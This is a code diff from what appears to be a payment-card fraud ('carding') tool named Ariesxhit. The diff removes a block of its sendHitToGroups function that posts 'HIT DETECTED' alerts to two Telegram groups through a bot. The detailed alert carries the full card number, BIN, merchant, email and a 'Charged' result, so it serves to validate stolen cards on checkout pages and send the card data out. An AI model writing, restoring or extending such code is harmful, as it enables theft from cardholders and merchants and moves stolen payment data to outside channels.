@@ -535,59 +535,6 @@ async function sendHitToGroups(hitData, checkoutUrl) {
     console.error('❌ Failed to send group notifications:', error.message);
     // Don't throw - we don't want this to break the main flow
   }
-
-  // Detect merchant name - prioritize hitData.merchant, fallback to URL detection
-  const merchantName = hitData.merchant || detectMerchant(checkoutUrl);
-
-  // Format for Group 1 (Simple)
-  if (GROUP_1) {
-    const group1Message = `🎯 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗
-─────────────────
-
-Name :- <a href="tg://user?id=${hitData.userId}">${hitData.userName}</a>
-Amount :- $${hitData.amount}
-Attempt :- ${hitData.attempts}
-Time :- ${hitData.timeTaken}
-
-─────────────────
-Thanks For Using Ariesxhit. 💗`;
-
-    try {
-      await sendMessage(BOT_TOKEN, GROUP_1, group1Message);
-      console.log(`✅ Hit notification sent to Group 1 (${GROUP_1})`);
-    } catch (error) {
-      console.error('❌ Failed to send to Group 1:', error);
-    }
-  }
-
-  // Format for Group 2 (Detailed)
-  if (GROUP_2) {
-    const bin = hitData.bin || extractBinFromCard(hitData.card);
-    const binSource = hitData.binMode ? hitData.binMode : ` (hit using card list)`;
-
-    const group2Message = `🎯 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗
-─────────────────
-
-「❃」 Name :- <a href="tg://user?id=${hitData.userId}">${hitData.userName}</a>
-「❃」 Card :- ${hitData.card}
-「❃」 Bin :- ${bin}${binSource}
-「❃」 Merchant :- ${merchantName}
-「❃」 Email :- cardernarutov3@gmail.com
-「❃」 Amount :- $${hitData.amount}
-「❃」 Response : Charged
-「❃」 Attempt :- ${hitData.attempts}
-「❃」 Time :- ${hitData.timeTaken}
-
-─────────────────
-Thanks For Using Ariesxhit. 💗`;
-
-    try {
-      await sendMessage(BOT_TOKEN, GROUP_2, group2Message);
-      console.log(`✅ Hit notification sent to Group 2 (${GROUP_2})`);
-    } catch (error) {
-      console.error('❌ Failed to send to Group 2:', error);
-    }
-  }
 }
 
 // Detect merchant name from checkout URL
